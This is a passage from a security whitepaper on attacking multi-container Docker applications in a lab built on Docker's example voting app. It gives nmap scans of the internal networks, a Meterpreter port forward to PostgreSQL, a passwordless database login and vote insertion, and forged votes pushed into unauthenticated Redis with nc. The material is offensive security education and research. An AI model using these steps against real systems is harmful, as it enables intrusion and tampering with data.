5001/tcp  open  unknown
5002/tcp  open  rfe
5355/tcp  open  hostmon
5858/tcp  open  unknown
32774/tcp open  unknown
Nmap scan report for examplevotingapp_result_1.examplevotingapp_front-tier 
(172.20.0.2)
Host is up (0.00038s latency).
Not shown: 65534 closed ports
PORT   STATE SERVICE
80/tcp open  http
Nmap scan report for a3f280146222 (172.20.0.3)
Host is up (0.000066s latency).
Not shown: 65534 closed ports
PORT   STATE SERVICE
80/tcp open  http
Nmap scan report for examplevotingapp_vote_1.examplevotingapp_front-tier 
(172.20.0.4)
Host is up (0.00038s latency).
Wesley McGrew
HORNECyber.com
29
An Attacker Looks at Docker: Approaching Multi-Container Applications
Not shown: 65534 closed ports
PORT   STATE SERVICE
80/tcp open  http
Nmap done: 10 IP addresses (4 hosts up) scanned in 5.98 seconds
./nmap -sT -p1-65535 172.21.0.1-10    
Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2018-01-30 19:46 UTC
Unable to find nmap-services!  Resorting to /etc/services
Cannot find nmap-payloads. UDP payloads are disabled.
Nmap scan report for lappy (172.21.0.1)
Host is up (0.00015s latency).
Not shown: 65525 closed ports
PORT      STATE SERVICE
80/tcp    open  http
443/tcp   open  https
902/tcp   open  unknown
4000/tcp  open  unknown
5000/tcp  open  unknown
5001/tcp  open  unknown
5002/tcp  open  rfe
5355/tcp  open  hostmon
5858/tcp  open  unknown
32774/tcp open  unknown
Nmap scan report for db.examplevotingapp_back-tier (172.21.0.2)
Host is up (0.00038s latency).
Not shown: 65534 closed ports
PORT     STATE SERVICE
5432/tcp open  postgresql
Nmap scan report for redis.examplevotingapp_back-tier (172.21.0.3)
Host is up (0.00036s latency).
Not shown: 65534 closed ports
PORT     STATE SERVICE
6379/tcp open  unknown
Nmap scan report for examplevotingapp_result_1.examplevotingapp_back-tier 
(172.21.0.4)
Host is up (0.00014s latency).
Not shown: 65534 closed ports
PORT   STATE SERVICE
80/tcp open  http
Wesley McGrew
HORNECyber.com
30
An Attacker Looks at Docker: Approaching Multi-Container Applications
Nmap scan report for a3f280146222 (172.21.0.5)
Host is up (0.000074s latency).
Not shown: 65534 closed ports
PORT   STATE SERVICE
80/tcp open  http
Nmap scan report for examplevotingapp_worker_1.examplevotingapp_back-tier 
(172.21.0.6)
Host is up (0.00024s latency).
All 65535 scanned ports on examplevotingapp_worker_1.examplevotingapp_back-
tier (172.21.0.6) are closed
Nmap scan report for examplevotingapp_vote_1.examplevotingapp_back-tier 
(172.21.0.7)
Host is up (0.00028s latency).
Not shown: 65534 closed ports
PORT   STATE SERVICE
80/tcp open  http
Nmap done: 10 IP addresses (7 hosts up) scanned in 9.58 seconds
In the above output, we have scanned the first ten IP addresses in each of the two networks. Docker seems to 
assign IP addresses incrementally, so scanning both /16 networks completely isn’t necessary in this specific 
case. We see a number of ports (including the externally forwarded ports) on the host on the “.1” IP address of 
both networks.
Also, we see each of our containers, helpfully with descriptive hostnames that indicate their name (and network 
names) in the docker-compose.yml file:
• 
examplevotingapp_result_1.examplevotingapp_front-tier (172.20.0.2)
• 
a3f280146222 (172.20.0.3) (the Joomla target we inserted)
• 
examplevotingapp_vote_1.examplevotingapp_front-tier (172.20.0.4)
• 
db.examplevotingapp_back-tier (172.21.0.2)
• 
redis.examplevotingapp_back-tier (172.21.0.3)
• 
examplevotingapp_result_1.examplevotingapp_back-tier (172.21.0.4)
• 
a3f280146222 (172.21.0.5)
• 
examplevotingapp_worker_1.examplevotingapp_back-tier (172.21.0.6)
examplevotingapp_vote_1.examplevotingapp_back-tier (172.21.0.7)
Note that, as described in the Compose file, the Joomla target (which we have compromised), the voting 
container, and the results container are all on both networks (172.20 and 172.21).
Wesley McGrew
HORNECyber.com
31
An Attacker Looks at Docker: Approaching Multi-Container Applications
ATTACKING THE APPLICATION-INTERNAL DATABASE SERVER
We can use our Meterpreter session to forward a local port through the compromised container to the PostgreSQL 
database server that we have identified.
meterpreter > portfwd add -L 127.0.0.1 -l 8999 -p 5432 -r 172.21.0.2
[*] Local TCP relay created: 127.0.0.1:8999  172.21.0.2:5432
The default username for the official PostgreSQL image being used is “postgres”, with no default password. We 
can attempt to connect to the database, examine the tables, and modify the voting results.
root@d86ebfd97e54:/# psql -h 127.0.0.1 -p 8999 -U postgres
psql (10.1 (Debian 10.1-3), server 9.4.15)
Type “help” for help.
postgres=# \dt
        List of relations
 Schema | Name  | Type  |  Owner   
--------+-------+-------+----------
 public | votes | table | postgres
postgres=# select * from votes;
        id        | vote
------------------+------
 6318cb4c0b00af50 | a
postgres=# INSERT INTO votes (id, vote) VALUES (‘1’,’b’), (‘2’,’b’), 
(‘3’,’b’), (‘4’,’b’);
postgres=# \q
Wesley McGrew
HORNECyber.com
32
An Attacker Looks at Docker: Approaching Multi-Container Applications
The Redis server is similarly wide open by default, requiring no authentication. We can telnet into its open 
TCP port and use the MONITOR command to begin watching the output of commands being issued to it. The 
following shows the “worker” container continuously polling for new commands, and a vote being submitted by 
the front-end.
+1517345973.133383 [0 172.21.0.6:48177] “LPOP” “votes”
+1517345973.235806 [0 172.21.0.6:48177] “LPOP” “votes”
+1517345973.338204 [0 172.21.0.6:48177] “LPOP” “votes”
+1517345973.440434 [0 172.21.0.6:48177] “LPOP” “votes”
+1517345973.503102 [0 172.21.0.7:49212] “RPUSH” “votes” “{\”vote\”: \”b\”, 
\”voter_id\”: \”6318cb4c0b00af50\”}”
+1517345973.543386 [0 172.21.0.6:48177] “LPOP” “votes”
+1517345973.875534 [0 172.21.0.6:48177] “LPOP” “votes”
+1517345973.977387 [0 172.21.0.6:48177] “LPOP” “votes”
+1517345974.078515 [0 172.21.0.6:48177] “LPOP” “votes”
With this information, we can insert our own votes via Redis, that will eventually wind up in the PostgreSQL 
container (by way of the worker).
www-data@a3f280146222:/$ nc redis 6379
nc redis 6379
RPUSH votes “{\”vote\”: \”a\”, \”voter_id\”: \”a\”}”
RPUSH votes “{\”vote\”: \”a\”, \”voter_id\”: \”a\”}”
:1
RESULTS AFTER INSERTING VOTES DIRECTLY INTO THE DATABASE CONTAINER
Wesley McGrew
HORNECyber.com
33
An Attacker Looks at Docker: Approaching Multi-Container Applications
RPUSH votes “{\”vote\”: \”a\”, \”voter_id\”: \”b\”}”
RPUSH votes “{\”vote\”: \”a\”, \”voter_id\”: \”c\”}”
RPUSH votes “{\”vote\”: \”a\”, \”voter_id\”: \”d\”}”
RPUSH votes “{\”vote\”: \”a\”, \”voter_id\”: \”e\”}”
RPUSH votes “{\”vote\”: \”a\”, \”voter_id\”: \”f\”}”
RPUSH votes “{\”vote\”: \”a\”, \”voter_id\”: \”g\”}”
RPUSH votes “{\”vote\”: \”a\”, \”voter_id\”: \”h\”}”
RPUSH votes “{\”vote\”: \”a\”, \”voter_id\”: \”i\”}”
RPUSH votes “{\”vote\”: \”a\”, \”voter_id\”: \”j\”}”RPUSH votes “{\”vote\”: 
\”a\”, \”voter_id\”: \”b\”}”
:1
RPUSH votes “{\”vote\”: \”a\”, \”voter_id\”: \”c\”}”
:2
RPUSH votes “{\”vote\”: \”a\”, \”voter_id\”: \”d\”}”
:2
RPUSH votes “{\”vote\”: \”a\”, \”voter_id\”: \”e\”}”
:2
RPUSH votes “{\”vote\”: \”a\”, \”voter_id\”: \”f\”}”
:3
RPUSH votes “{\”vote\”: \”a\”, \”voter_id\”: \”g\”}”
:4
RPUSH votes “{\”vote\”: \”a\”, \”voter_id\”: \”h\”}”
:4
RPUSH votes “{\”vote\”: \”a\”, \”voter_id\”: \”i\”}”
:5
Wesley McGrew
HORNECyber.com
34
An Attacker Looks at Docker: Approaching Multi-Container Applications
RESULTS AFTER PUSHING VOTES INTO THE REDIS CONTAINER QUEUE
We’re currently a relatively unprivileged user within the container we’ve compromised, though it has given us a 
high degree of leverage across the multi-container application. 
CONCLUSIONS
Applications made up of multiple containers have the potential to provide “extra” internal networks that attackers 
can interact with after the initial compromise of an application’s external attack surface. In this work, we have 
explored the fundamentals of the Docker platform, as an attacker would see them on typical applications. An 
attacker trained in exploitation of systems and networks, but not necessarily on the instrumentation of monolithic 
application internals, can use this information and their existing training to easily explore and manipulate the 
internals of multi-container applications that they gain a foothold on. This paper and its associated talk should 
get attackers, otherwise unfamiliar with containerization platforms, a jump start on experimenting with them 
and allow them to identify and more effectively attack them on real-world offensive engagements.
Wesley McGrew
HORNECyber.com
35
An Attacker Looks at Docker: Approaching Multi-Container Applications
1.   David Mortman, Docker, Docker, Give Me the News, I Got a Bad Case of Securing You, DEF CON
23,  
https://media.defcon.org/DEF%20CON%2023/DEF%20CON%2023%20presentations/DEFCON-
23-David-Mortman-Docker-UPDATED.pdf
2.   Gotham Digital Science, Docker Secure Deployment Guidelines
https://github.com/GDSSecurity/Docker-Secure-Deployment-Guidelines
3.   Aaron Grattafiori, Linux Containers: Future or Fantasy?, DEF CON 23,
https://media.defcon.org/DEF%20CON%2023/DEF%20CON%2023%20presentations/DEFCON-
23-Aaron-Grattafiori-Linux-Containers-Future-or-Fantasy-UPDATED.pdf
4.   Aaron Grattafiori, Understanding and Hardening Linux Containers,
https://www.nccgroup.trust/us/our-research/understanding-and-hardening-linux-containers/
5.   Anthony Bettini, Vulnerability Exploitation in Docker Containers, Black Hat Europe 2015,
https://www.blackhat.com/docs/eu-15/materials/eu-15-Bettini-Vulnerability-Exploitation-In-Docker-
Container-Environments.pdf
6.   Michael Cherney and Sagie Duce, Well, That Escalated Quickly! How Abusing Docker API Led
  to Remote Code Execution, Same Origin Bypass and Persistence in The Hypervisor via Shadow
  Containers, Black Hat USA 2017,
https://www.blackhat.com/docs/us-17/thursday/us-17-Cherny-Well-That-Escalated-Quickly-How-
Abusing-The-Docker-API-Led-To-Remote-Code-Execution-Same-Origin-Bypass-And-Persistence_
wp.pdf
7.   HD Moore and Valsmith, Tactical Exploitation, DEF CON 15,
https://www.defcon.org/images/defcon-15/dc15-presentations/Moore_and_Valsmith/White paper/dc-
15-moore_and_valsmith-WP.pdf
8.   Erik Buchanan, Ryan Roemer, and Stefan Savage, Return-Oriented Programming: Exploits Without
  Code Injection, Black Hat USA 2008,
  http://cseweb.ucsd.edu/~hovav/talks/blackhat08.html
9.   Sergey Bratus, What Are Weird Machines?,
http://www.cs.dartmouth.edu/~sergey/wm/
10. Wesley McGrew, Secure Penetration Testing Operations: Demonstrated Weaknesses in Learning
Materials and Tools, DEF CON 24 and Black Hat USA 2016,
https://media.defcon.org/DEF%20CON%2024/DEF%20CON%2024%20presentations/DEFCON-
24-Wesley-McGrew-Secure-Penetration-Testing-Operations-WP.pdf
BIBLIOGRAPHY
Wesley McGrew
HORNECyber.com
36
An Attacker Looks at Docker: Approaching Multi-Container Applications
11. The Docker Platform,
https://www.docker.com/
12. Chris Richardson, Pattern: Microservice Architecture,
https://docs.docker.com/engine/examples/running_ssh_service/
13. Dockerize an SSH Service,
https://docs.docker.com/engine/examples/running_ssh_service/
14. A vulnerable Joomla image “in the wild”,
https://hub.docker.com/r/kuthz/joomla/
15. Example Voting App,
https://github.com/dockersamples/example-voting-app
16. Docker Security, Docker Documentation,
https://docs.docker.com/engine/security/security
BIBLIOGRAPHY